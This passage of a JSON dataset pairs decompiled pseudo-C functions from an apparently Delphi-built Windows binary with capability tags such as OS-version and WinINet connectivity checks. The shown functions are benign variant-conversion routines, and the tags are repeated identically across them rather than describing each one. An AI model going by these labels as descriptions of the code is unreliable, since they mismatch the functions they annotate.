        "decompiled_code": "\nuint32_t fcn.004126a4(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (18 cases) at 0x4126dd\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x491a5c != '\\0') {\n            puStack24 = 0x412716;\n            fcn.00410e58();\n        }\n        uVar1 = 0;\n        break;\n    case 2:\n        uVar1 = in_EAX[4];\n        break;\n    default:\n        uStack28 = 0x412779;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.004120f8();\n        if (0xffff < uVar1 + 0x8000) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x10:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 347
    },
    "0041279c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041279c(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (19 cases) at 0x4127d2\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x491a5c != '\\0') {\n            puStack24 = 0x412804;\n            fcn.00410e58();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x412852;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.004120f8();\n        if (0xffff < uVar1) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n    }\n    return uVar1;\n}\n",
        "token_count": 321
    },
    "00412878": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412878(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    ulong uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (20 cases) at 0x4128b3\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x491a5c != '\\0') {\n            puStack24 = 0x4128ec;\n            fcn.00410e58();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x41293e;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.00412bc8();\n        uVar1 = uVar2;\n        if (uVar2 >> 0x20 != 0) {\n            uVar1 = fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 369
    },
    "00412bc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00412bc8(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar3 = CONCAT44(var_ch, var_10h);\n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x412fd4;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x412bfb\n    switch(uVar1) {\n    case 0:\n        uVar3 = 0;\n        break;\n    case 1:\n        if (*0x491a5c != '\\0') {\n            puStack36 = &stack0xfffffffc;\n            fcn.00410e58();\n        }\n        uVar3 = 0;\n        break;\n    case 2:\n        uVar3 = in_EAX[4];\n        break;\n    case 3:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 5:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 6:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 7:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 8:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00412a10();\n        break;\n    case 9:\n    case 0xd:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00412964();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.00412a10();\n        }\n        else if (uVar1 == 0x101) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.00412b10();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack36 = &stack0xfffffffc;\n            cVar2 = fcn.00412b7c();\n            if (cVar2 == '\\0') {\n                uVar3 = fcn.00412964();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x412e1f\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412964();\n                break;\n            case 2:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 3:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 5:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 6:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 7:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 8:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412a10();\n                break;\n            case 0xb:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412bc8();\n                break;\n            case 0x10:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                uVar3 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        uVar3 = in_EAX[4];\n        break;\n    case 0xc:\n        uVar3 = fcn.00412bc8();\n        break;\n    case 0x10:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar3 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        uVar3 = *(in_EAX + 4);\n    }\n    *in_FS_OFFSET = uStack44;\n    return uVar3;\n}\n",
        "token_count": 1249
    },
    "004131c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.004131c0(uint32_t param_1)\n\n{\n    uint16_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint16_t *in_EAX;\n    bool bVar4;\n    uint32_t uStack8;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x4131da\n    switch(uVar1) {\n    case 0:\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 1:\n        if (*0x491a5c != '\\0') {\n            fcn.00410e58();\n        }\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 2:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 3:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 4:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413510;\n        break;\n    case 5:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413510;\n        break;\n    case 6:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413510;\n        break;\n    case 7:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413510;\n        break;\n    case 8:\n        uVar2 = fcn.0041300c();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    case 9:\n    case 0xd:\n        uVar2 = fcn.004130d0();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            uVar2 = fcn.0041300c();\n            uStack8 = param_1 & 0xffffff00 | uVar2;\n        }\n        else if (uVar1 == 0x101) {\n            uVar2 = fcn.00413110();\n            uStack8 = param_1 & 0xffffff00 | uVar2;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar3 = fcn.00413174();\n            uStack8 = param_1;\n            if (cVar3 == '\\0') {\n                uVar2 = fcn.004130d0();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4133a0\n            switch(uVar1 & 0xbfff) {\n            default:\n                uVar2 = fcn.004130d0();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 2:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 3:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 4:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413510;\n                break;\n            case 5:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413510;\n                break;\n            case 6:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413510;\n                break;\n            case 7:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413510;\n                break;\n            case 8:\n                uVar2 = fcn.0041300c();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 0xb:\n                uStack8 = param_1 & 0xffffff00 | 1 - (**(in_EAX + 4) == 0);\n                break;\n            case 0xc:\n                uVar2 = fcn.004131c0();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 0x10:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != '\\0';\n                break;\n            case 0x11:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != '\\0';\n                break;\n            case 0x12:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0x13:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0x14:\n                bVar4 = (*(in_EAX + 4))[1] == 0;\n                if (bVar4) {\n                    bVar4 = **(in_EAX + 4) == 0;\n                }\n                uStack8 = param_1 & 0xffffff00 | !bVar4;\n            }\n        }\n        break;\n    case 0xb:\n        uStack8 = param_1 & 0xffffff00 | 1 - (in_EAX[4] == 0);\n        break;\n    case 0xc:\n        uVar2 = fcn.004131c0();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    case 0x10:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x11:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x12:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 0x13:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 0x14:\n        bVar4 = *(in_EAX + 6) == 0;\n        if (bVar4) {\n            bVar4 = *(in_EAX + 4) == 0;\n        }\n        uStack8 = param_1 & 0xffffff00 | !bVar4;\n    }\n    return CONCAT44(uStack8, uStack8) & 0xffffffff000000ff;\n}\n",
        "token_count": 1597
    },
    "004136d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004136d4(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    double dStack24;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x4136f0\n    switch(uVar1) {\n    case 0:\n        dStack24 = 0.0;\n        break;\n    case 1:\n        if (*0x491a5c != '\\0') {\n            fcn.00410e58();\n        }\n        dStack24 = 0.0;\n        break;\n    case 2:\n        dStack24 = in_EAX[4];\n        break;\n    case 3:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 4:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 5:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 6:\n        dStack24 = *(in_EAX + 4) / *0x413a48;\n        break;\n    case 7:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 8:\n        fVar3 = fcn.00413514();\n        dStack24 = fVar3;\n        break;\n    case 9:\n    case 0xd:\n        fVar3 = fcn.004135d8();\n        dStack24 = fVar3;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            fVar3 = fcn.00413514();\n            dStack24 = fVar3;\n        }\n        else if (uVar1 == 0x101) {\n            fVar3 = fcn.00413624();\n            dStack24 = fVar3;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar2 = fcn.00413688();\n            if (cVar2 == '\\0') {\n                fVar3 = fcn.004135d8();\n                dStack24 = fVar3;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4138cc\n            switch(uVar1 & 0xbfff) {\n            default:\n                fVar3 = fcn.004135d8();\n                dStack24 = fVar3;\n                break;\n            case 2:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 3:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 4:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 5:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 6:\n                dStack24 = **(in_EAX + 4) / *0x413a48;\n                break;\n            case 7:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 8:\n                fVar3 = fcn.00413514();\n                dStack24 = fVar3;\n                break;\n            case 0xb:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                fVar3 = fcn.004136d4();\n                dStack24 = fVar3;\n                break;\n            case 0x10:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                dStack24 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        dStack24 = in_EAX[4];\n        break;\n    case 0xc:\n        fVar3 = fcn.004136d4();\n        dStack24 = fVar3;\n        break;\n    case 0x10:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        dStack24 = in_EAX[4];\n        break;\n    case 0x13:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        dStack24 = *(in_EAX + 4);\n    }\n    return dStack24;\n}\n",
        "token_count": 1062
    },
    "00413a4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00413a4c(void)\n\n{\n    ushort *in_EAX;\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    float var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    // switch table (21 cases) at 0x413a6e\n    switch(*in_EAX) {\n    case 0:\n        var_8h = 0.0;\n        break;\n    case 1:\n        if (*0x491a5c != '\\0') {\n            puStack40 = 0x413ae2;\n            fcn.00410e58();\n        }\n        var_8h = 0.0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        var_8h = *(in_EAX + 4);\n        break;\n    default:\n        uStack44 = 0x413bb1;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        fVar1 = fcn.004136d4();\n        var_8h = fVar1;\n        *in_FS_OFFSET = uStack48;\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n    }\n    return var_8h;\n}\n",
        "token_count": 483
    },
    "00413e24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00413e24(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    double in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = SUB84(in_stack_ffffffe0, 0);\n    // switch table (21 cases) at 0x413e40\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x491a5c != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x413eb8, uVar4);\n            fcn.00410e58();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n    case 6:\n        in_stack_ffffffe0 = CONCAT44(0x413ee5, uVar4);\n        fcn.00413d28();\n        break;\n    case 7:\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x413f07, uVar4);\n        fcn.00413bdc();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x413fb0, uVar4);\n        fcn.00413d28();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x413fd0, uVar4);\n            fcn.00413bdc();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x413fe0, uVar4);\n            fcn.00413d74();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x41415a, uVar4);\n            cVar2 = fcn.00413dd8();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x414165, SUB84(in_stack_ffffffe0, 0));\n                fcn.00413d28();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x41400a\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x41414b, uVar4);\n                fcn.00413d28();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n            case 6:\n                in_stack_ffffffe0 = CONCAT44(0x414081, uVar4);\n                fcn.00413d28();\n                break;\n            case 7:\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x4140a5, uVar4);\n                fcn.00413bdc();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x41413e, uVar4);\n                fcn.00413e24();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.00413cc8(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = fVar3;\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x413fa0, uVar4);\n        fcn.00413e24();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.00413cc8(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = fVar3;\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1016
    },
    "0041438c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.0041438c(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    int64_t in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = in_stack_ffffffe0;\n    // switch table (21 cases) at 0x4143a8\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x491a5c != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x414420, uVar4);\n            fcn.00410e58();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n        in_stack_ffffffe0 = CONCAT44(0x414459, uVar4);\n        fcn.00414290();\n        break;\n    case 6:\n        break;\n    case 7:\n        in_stack_ffffffe0 = CONCAT44(0x41447b, uVar4);\n        fcn.00414290();\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x41448b, uVar4);\n        fcn.00414174();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x414552, uVar4);\n        fcn.00414290();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x414572, uVar4);\n            fcn.00414174();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x414582, uVar4);\n            fcn.004142dc();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x414739, uVar4);\n            cVar2 = fcn.00414340();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x414744, in_stack_ffffffe0);\n                fcn.00414290();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4145ac\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x41472a, uVar4);\n                fcn.00414290();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n                in_stack_ffffffe0 = CONCAT44(0x41462f, uVar4);\n                fcn.00414290();\n                break;\n            case 6:\n                break;\n            case 7:\n                in_stack_ffffffe0 = CONCAT44(0x414653, uVar4);\n                fcn.00414290();\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x414663, uVar4);\n                fcn.00414174();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x41471d, uVar4);\n                fcn.0041438c();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.00414230(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = ROUND(fVar3);\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x414542, uVar4);\n        fcn.0041438c();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.00414230(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = ROUND(fVar3);\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1054
    },
    "004149bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004149bc(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint *puStack40;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    puStack40 = 0x4149de;\n    var_4h = param_2;\n    var_5h = fcn.00416178();\n    if (var_5h != '\\0') {\n        puStack40 = &fcn.004149bc::pvarg;\n        puStack44 = 0x4149f0;\n        sub.oleaut32.dll_VariantInit();\n        uStack48 = 0x414a31;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        puStack44 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))();\n        fcn.00405584();\n        *in_FS_OFFSET = 0x100;\n        uStack48 = 0x414a38;\n        uStack52 = 0x414a30;\n        uVar1 = fcn.0041163c();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 332
    },
    "00414a44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00414a44(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 0xe;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x414f70;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00414a44::var_20h;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x414a7e\n    switch(uVar1) {\n    case 0:\n        var_18h = &stack0xfffffffc;\n        fcn.00405530();\n        break;\n    case 1:\n        var_18h = &stack0xfffffffc;\n        if (*0x491a5c != '\\0') {\n            var_18h = &stack0xfffffffc;\n            fcn.00410e58();\n        }\n        fcn.00405584();\n        break;\n    case 2:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d70();\n        fcn.00405584();\n        break;\n    case 3:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d70();\n        fcn.00405584();\n        break;\n    case 4:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040b6e0(var_2ch);\n        